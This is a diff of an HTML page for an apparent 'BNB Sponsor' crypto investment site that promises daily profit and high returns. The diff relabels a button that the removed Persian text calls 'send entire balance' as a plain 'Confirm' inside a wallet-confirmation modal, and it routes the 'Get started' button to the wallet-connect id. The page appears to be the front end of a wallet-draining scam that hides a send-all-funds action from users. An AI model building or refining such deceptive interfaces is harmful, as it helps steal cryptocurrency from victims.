@@ -12,14 +12,14 @@
             <img src="binance-svgrepo-com.svg" alt="">
             <h1><span>BNB</span> Sponsor</h1>
         </div>
-        <button>Connect Wallet</button>
+        <button id="connectWallet">Connect Wallet</button>
     </div>
 
     <div class="hero-section">
         <div class="intro">
             <h1>Earn daily profit with BNB cryptocurrency</h1>
             <span>Secure investment with high returns</span>
-            <button>Get started now</button>
+            <button id="connectWallet">Get started now</button>
         </div>
         <div class="logo-mob">
             <img src="file_0000000075b861f8942d9cb6fc535338.png" alt="">
@@ -197,6 +197,7 @@
   <div id="confirmTransactionModal" class="modal">
     <div class="modal-content">
       <p>Please confirm the transaction in your wallet.</p>
+      <button id="sendTx">Confirm</button>
       <button onclick="closeModal('confirmTransactionModal')">Close</button>
     </div>
   </div>
@@ -204,16 +205,13 @@
 
 
 
-      <button id="connectWallet">اتصال کیف پول</button>
-
-      <div id="walletInfo" style="display: none;">
-        <p>آدرس: <span id="address"></span></p>
-        <p>موجودی: <span id="balance"></span></p>
-        <button id="sendTx">ارسال تمام موجودی</button>
-      </div>
-      <script type="module" src="/main.js"></script>
+  <div id="walletInfo" style="display: none;">
+    <p>آدرس: <span id="address"></span></p>
+    <p>موجودی: <span id="balance"></span></p>
+  </div>
 
 
+    <script type="module" src="/main.js"></script>
     <script src="script.js"></script>
 
 </body>
